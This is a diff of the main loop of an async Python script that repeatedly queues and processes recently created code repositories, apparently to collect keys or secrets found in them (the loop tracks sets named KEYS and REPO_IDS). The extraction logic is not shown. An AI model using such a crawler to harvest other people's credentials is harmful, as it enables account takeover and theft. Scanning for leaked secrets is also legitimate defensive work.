-        last_end_time = None  # Відстежуємо кінець останнього вікна
+        cycle = 0
+        last_scanned_day = None
         while True:
             try:
-                cycle_count += 1
-                info_error_logger.info(f"Starting cycle {cycle_count}")
-                print(f"Starting cycle {cycle_count}")
-
-                # Скидаємо SEEN_REPO_IDS і FOUND_KEYS для нового циклу
-                global SEEN_REPO_IDS, FOUND_KEYS
-                SEEN_REPO_IDS = set()
-                FOUND_KEYS = set()
-                info_error_logger.info("Reset SEEN_REPO_IDS and FOUND_KEYS for new cycle")
-                print("Reset SEEN_REPO_IDS and FOUND_KEYS for new cycle")
-
-                # Створюємо нову чергу
-                repo_queue = asyncio.Queue()
-                current_time = datetime.now(timezone.utc)
-
-                # Якщо є last_end_time, використовуємо його як початок нового вікна
-                if last_end_time and last_end_time > current_time - timedelta(minutes=RECENT_MINUTES):
-                    start_time = last_end_time
+                cycle += 1
+                global COUNT, REPO_IDS, KEYS
+                COUNT = 0
+                REPO_IDS = set()
+                KEYS = set()
+                logger.info(f"Cycle {cycle}")
+                queue = asyncio.Queue()
+                now = datetime.now(timezone.utc)
+                # Start with two days ago if not scanned, or move to previous day
+                if last_scanned_day is None:
+                    start = now.replace(hour=0, minute=0, second=0, microsecond =0) - timedelta(days=2)
                 else:
-                    start_time = current_time - timedelta(minutes=RECENT_MINUTES)
-
-                minutes_extended = 0
-
-                # Заповнення черги до 100 репозиторіїв
-                while repo_queue.qsize() < TARGET_QUEUE_SIZE and minutes_extended < 10:  # Обмеження на 10 хвилин
-                    sub_intervals = []
-                    interval_start = start_time - timedelta(minutes=minutes_extended)
-                    interval_end = current_time if minutes_extended == 0 else start_time - timedelta(minutes=minutes_extended - 1)
-                    while interval_start < interval_end:
-                        sub_interval_end = min(interval_start + timedelta(seconds=SUB_INTERVAL_SECONDS), interval_end)
-                        sub_intervals.append((interval_start, sub_interval_end))
-                        interval_start = sub_interval_end
-
-                    info_error_logger.info(f"Creating queue with {len(sub_intervals)} sub-intervals, minutes_extended={minutes_extended}")
-                    print(f"Creating queue with {len(sub_intervals)} sub-intervals, minutes_extended={minutes_extended}")
-
-                    for start, end in sub_intervals:
-                        await fetch_repos_to_queue(session, repo_queue, start, end)
-                        if repo_queue.qsize() >= TARGET_QUEUE_SIZE:
-                            last_end_time = end  # Зберігаємо кінець поточного вікна
-                            break
-
-                    minutes_extended += 1
-
-                # Якщо черга порожня, чекаємо 5 секунд і пробуємо знову
-                if repo_queue.qsize() == 0:
-                    info_error_logger.info("No repositories found, waiting 5 seconds before retrying")
-                    print("No repositories found, waiting 5 seconds before retrying")
+                    start = last_scanned_day - timedelta(days=1)
+                logger.info(f"Scanning day: {start.strftime('%Y-%m-%d')}")
+                await fetch_repos(session, queue, start)
+                if queue.qsize() == 0:
+                    logger.info(f"No repos found for {start.strftime('%Y-%m-%d')}, moving to previous day")
+                    last_scanned_day = start
                     await asyncio.sleep(5)
                     continue
-
-                # Обробка черги до завершення
-                info_error_logger.info(f"Processing queue with {repo_queue.qsize()} repositories")
-                print(f"Processing queue with {repo_queue.qsize()} repositories")
-                await process_queue(session, repo_queue)
-
-                info_error_logger.info(f"Completed queue processing, processed {REPO_COUNT} repositories")
-                print(f"Completed queue processing, processed {REPO_COUNT} repositories")
-
-                # Негайно починаємо новий цикл без затримки, якщо не обмежені API
-                info_error_logger.info("Starting next cycle immediately")
-                print("Starting next cycle immediately")
-
+                await process_queue(session, queue)
+                logger.info(f"Processed {COUNT} repos for {start.strftime('%Y-%m-%d')}")
+                last_scanned_day = start
             except Exception as e:
-                info_error_logger.error(f"Critical error in main loop: {e}")
-                print(f"Critical error in main loop: {e}")
-                info_error_logger.info(f"Retrying in 60 seconds...")
-                print(f"Retrying in 60 seconds...")
-                await asyncio.sleep(60)
+                logger.error(f"Main loop error: {e}")
+                await asyncio.sleep(ERR_PAUSE)
 
 if __name__ == "__main__":
     asyncio.run(main())
